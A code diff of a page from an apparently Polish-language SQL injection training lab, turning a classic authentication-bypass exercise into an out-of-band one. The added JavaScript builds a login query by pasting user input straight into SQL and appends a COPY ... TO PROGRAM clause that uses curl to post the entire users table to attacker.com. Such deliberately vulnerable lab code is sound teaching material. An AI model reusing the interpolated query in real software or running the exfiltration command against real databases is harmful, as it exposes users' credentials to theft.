@@ -3,20 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>Classic SQL Injection</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Out-of-Band SQL Injection</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 </head>
 <body>
     <div class="container mt-5">
-        <h1>Authentication Bypass </h1>
-        <p>Celem zadania jest zalogować się na konto określonego użytkownika bez znania hasła. </p> 
-        <p>Użytkownik, na którego konto chcemy sie zalogować to: <span id="random-user" style="font-weight: bold;"></span></p>
-        {% include "login.html" %}
-
+        <h1>Out-of-Band SQL Injection</h1>
+        <p>Zaloguj się na użytkownika:</p> 
+        <p id="random-user"></p>
+        <form id="sqli-form" class="mt-4">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" class="form-control">
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" class="form-control">
+            </div>
+            <button type="submit" class="btn btn-primary">Submit</button>
+        </form>
         <div id="result" class="mt-4"></div>
     </div>
 
-    <!-- Modal z bootstrap do wyświetlania się okienka -->
+    <!-- Modal -->
     <div class="modal fade" id="resultModal" tabindex="-1" aria-labelledby="resultModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
@@ -55,9 +64,9 @@
                 return;
             }
 
-            const sqlQuery = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+            const sqlQuery = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'; COPY (SELECT * FROM users) TO PROGRAM 'curl -X POST -d @- http://attacker.com/log'`;
 
-            fetch('/classic_sqli_login', {
+            fetch('/out_of_band_sqli', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
